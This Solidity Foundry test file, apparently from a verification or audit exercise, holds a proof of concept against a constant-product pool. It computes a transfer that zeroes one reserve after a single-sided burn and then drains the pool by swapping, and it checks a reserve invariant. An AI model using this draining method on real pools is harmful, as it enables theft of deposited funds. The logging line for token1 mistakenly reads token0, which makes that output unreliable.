// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";
import {ERC20} from "../src/ERC20.sol";
import {DummyERC20A} from "../certora/helpers/DummyERC20A.sol";
import {DummyERC20B} from "../certora/helpers/DummyERC20B.sol";
import {CPPSetup} from "./CPPSetup.sol";

contract CPPMiniTest is Test {
    CPPSetup public cpp;
    DummyERC20A public token0;
    DummyERC20B public token1;

    uint256 private constant START_TOKENS = 1000e18;

    address[] users; 
    address private Alice = address(0x2);
    address private Bob = address(0x1);
    function setUp() public {
        token0 = new DummyERC20A();
        token1 = new DummyERC20B();
        cpp = new CPPSetup(address(token0), address(token1));

        
        users.push(Alice);
        users.push(Bob);
        
        for(uint256 i; i<users.length; ++i) {
            address user = users[i];
            // user approves CPPSetUP to transfer assets
            vm.startPrank(user);
            token0.mint(user,START_TOKENS);
            token1.mint(user,START_TOKENS);
            token0.approve(address(cpp), type(uint256).max);
            token1.approve(address(cpp), type(uint256).max);
            vm.stopPrank();
         }
        
        //first deposit
        vm.startPrank(Bob);
        cpp.transferAndMint(1234, 2345);
        vm.stopPrank();

        targetContract(address(cpp));
        targetSender(Alice);
        targetSender(Bob);
    }

    function test_manual() public  {
        vm.startPrank(Alice);
        cpp.transferAndMint(20,200);
        uint256 liquidity = cpp.balanceOf(Alice);
        uint256 _reserve0 = cpp.getReserve0();
        uint256 _totalSupply = cpp.totalSupply();
        uint256 _actualB0 = token0.balanceOf(address(cpp));
        uint256 _actualB1 = token1.balanceOf(address(cpp));
        /*
         we need _reserve0 == amount0
         amount0 === (liquidity * balance0 ) / _totalSupply
         _reserve0 === (liquidity * balance0 ) / _totalSupply 

        simple math we can compute it backwards 
         */


        uint256 balanceForBug = _reserve0 * _totalSupply /liquidity + 1;
        uint256 amountToTransfer = balanceForBug - _reserve0 ;
    
        cpp.externalTransfer(amountToTransfer, 0);
        cpp.burnSingle(true, liquidity);

        // now that we have one reserve 0 the invariant fails
        // invariant_reserve(); // comment this out to see how critical is this bug
        // but we can just continue to drain the protocol
        cpp.transferAndSwap(false, 1);
        _actualB0 = token0.balanceOf(address(cpp));
        _actualB1 = token0.balanceOf(address(cpp));
        console.log(_actualB0, _actualB1);
    }

    function invariant_reserve() public  view {
        uint256 reserve0 = cpp.getReserve0();
        uint256 reserve1 = cpp.getReserve1();
        assertEq(reserve0 == 0 , reserve1 == 0);
    }
}
